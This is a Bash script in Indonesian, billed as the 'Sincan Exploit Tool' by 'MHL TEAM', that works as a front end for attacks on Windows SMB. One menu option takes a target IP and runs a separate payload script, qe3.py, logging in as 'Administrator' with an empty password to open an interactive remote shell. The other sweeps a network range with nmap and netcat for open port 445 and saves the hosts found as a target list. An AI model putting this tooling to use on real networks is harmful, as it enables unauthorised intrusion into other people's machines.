#!/bin/bash

# ===============================================
# sodok.sh - v7.3 (Reverted)
# oleh MHL TEAM
# ===============================================

# --- Warna untuk Tampilan ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREY='\033[0;90m'
NC='\033[0m' # No Color

# --- Variabel Konfigurasi ---
VERSION="7.3"
EXPLOIT_SCRIPT="qe3.py"
PREFIX="  "

# --- Fungsi UI ---
function draw_line() {
    printf "${PREFIX}${GREY}──────────────────────────────────────────────────────────────────${NC}\n"
}

function display_banner() {
    clear
    printf "${RED}"
cat << 'EOF'
|  \      /  \|  \ |  \|  \           |        \|        \ /        \ |  \      /  \
| $$     /  $$| $$ | $$| $$            \$$$$$$$$| $$$$$$$$|  $$$$$$| $$     /  $$
| $$$   /  $$$| $$_| $$| $$                 | $$  | $$__    | $$__| $$| $$$   /  $$$
| $$$$   $$$$| $$   $$| $$                 | $$  | $$  \   | $$    $$| $$$$   $$$$
| $$\$$ $$ $$| $$$$$$$$| $$                 | $$  | $$$$$   | $$$$$$$$| $$\$$ $$ $$
| $$ \$$$| $$| $$ | $$| $$_____            | $$  | $$_____ | $$  | $$| $$ \$$$| $$
| $$  \$ | $$| $$ | $$| $$      \          | $$  | $$      \| $$  | $$| $$  \$ | $$
 \$$      \$$ \$$  \$$ \$$$$$$$$            \$$   \$$$$$$$$ \$$   \$$ \$$      \$$
EOF
    TITLE="Sincan Exploit Tool v${VERSION}  - by MHL TEAM -"
    printf "\n${PREFIX}${YELLOW}%s${NC}\n" "$TITLE"
}

# ===============================================
# --- FUNGSI UTAMA ---
# ===============================================

# --- Fungsi untuk Menu 1: Serang Target Tunggal ---
function menu_attack_single_target() {
    local target_ip
    # --- Kredensial diatur secara otomatis ---
    local username="Administrator"
    local password=""
    # ----------------------------------------
    local extra_args

    draw_line
    printf "${PREFIX}${YELLOW} Isi Detail Target Tunggal ${NC}\n"
    draw_line
    # PERBAIKAN: Pisahkan printf dan read
    printf "${PREFIX}${CYAN} -> Masukkan IP Target     : ${NC}"
    read target_ip
    draw_line

    # Menampilkan kredensial yang digunakan secara otomatis
    echo -e "${PREFIX}[${BLUE}i${NC}] Menggunakan kredensial otomatis:"
    echo -e "${PREFIX}  ${CYAN}Username: ${NC}${username}"
    echo -e "${PREFIX}  ${CYAN}Password: ${NC}(kosong)"
    draw_line


    if [ ! -f "$EXPLOIT_SCRIPT" ]; then
        echo -e "\n${PREFIX}[${RED}!${NC}] ${RED}Error: File payload '${EXPLOIT_SCRIPT}' tidak ditemukan.${NC}"
        exit 1
    fi

    echo -e "${PREFIX}[${BLUE}i${NC}] ${YELLOW}MELUNCURKAN REMOTE SHELL...${NC}"
    echo -e "${PREFIX}[${YELLOW}i${NC}] Anda akan masuk ke shell interaktif. Ketik 'exit' untuk keluar."
    echo ""

    # Karena password otomatis kosong, flag -no-pass selalu digunakan.
    extra_args="-no-pass"

    python3 ./${EXPLOIT_SCRIPT} ${extra_args} "${username}:${password}@${target_ip}"

    echo -e "\n${PREFIX}[${GREEN}+${NC}] ${GREEN}Sesi remote shell ditutup.${NC}"
}

# --- Fungsi untuk Menu 2: Pindai Jaringan ---
function menu_scan_network() {
    local network output_file="smb_hosts.txt"

    draw_line
    printf "${PREFIX}${YELLOW} Isi Detail Pindaian Jaringan ${NC}\n"
    draw_line
    # PERBAIKAN: Pisahkan printf dan read
    printf "${PREFIX}${CYAN} -> Masukkan Jaringan (CIDR): ${NC}"
    read network
    draw_line

    echo -e "${PREFIX}[${BLUE}i${NC}] ${YELLOW}Memulai Pindaian Port SMB (445) dengan Netcat...${NC}"
    echo -e "${PREFIX}[${CYAN}*${NC}] Target Jaringan: ${BLUE}${network}${NC}"
    
    # Kosongkan file hasil sebelum scan baru
    > "$output_file"

    local ip_list
    ip_list=$(nmap -sL -n "$network" | awk '/Nmap scan report for/{print $5}')
    local found_count=0

    for ip in $ip_list; do
        printf "${PREFIX}  ${GREY}[...] Mencoba host: %-15s\r${NC}" "$ip"
        # Menggunakan nc dengan timeout 1 detik
        if nc -z -w 1 "$ip" 445 >/dev/null 2>&1; then
            printf "${PREFIX}  ${GREEN}=> DITEMUKAN: Port 445 TERBUKA di %-15s${NC}\n" "$ip"
            echo "$ip" >> "$output_file"
            ((found_count++))
        fi
    done

    # Hapus baris "Mencoba host..." terakhir
    printf "%*s\r" "$(tput cols)" ""

    draw_line
    if [ "$found_count" -gt 0 ]; then
        echo -e "${PREFIX}[${GREEN}+${NC}] ${GREEN}Pindai selesai! Total ${found_count} target ditemukan.${NC}"
        echo -e "${PREFIX}[${BLUE}i${NC}] ${YELLOW}Hasil disimpan ke file: ${GREEN}${output_file}${NC}"
    else
        echo -e "${PREFIX}[${RED}-${NC}] ${RED}Tidak ada host dengan port 445 terbuka yang ditemukan.${NC}"
    fi
}

# ===============================================
# --- ALUR UTAMA SCRIPT ---
# ===============================================
display_banner

# Tampilkan Menu Pilihan
draw_line
printf "${PREFIX}${YELLOW} MENU UTAMA ${NC}\n"
draw_line
printf "${PREFIX}${CYAN} [1] ${NC} Serang Target Tunggal (Login Otomatis)\n"
printf "${PREFIX}${CYAN} [2] ${NC} Pindai Jaringan untuk Port SMB (445)\n"
draw_line
# PERBAIKAN: Pisahkan printf dan read
printf "${PREFIX}${YELLOW}Pilihan Anda [1/2]: ${NC}"
read main_choice

case "$main_choice" in
    1)
        menu_attack_single_target
        ;;
    2)
        menu_scan_network
        ;;
    *)
        echo -e "\n${PREFIX}[${RED}!${NC}] Pilihan tidak valid. Skrip dihentikan."
        exit 1
        ;;
esac

echo
exit 0
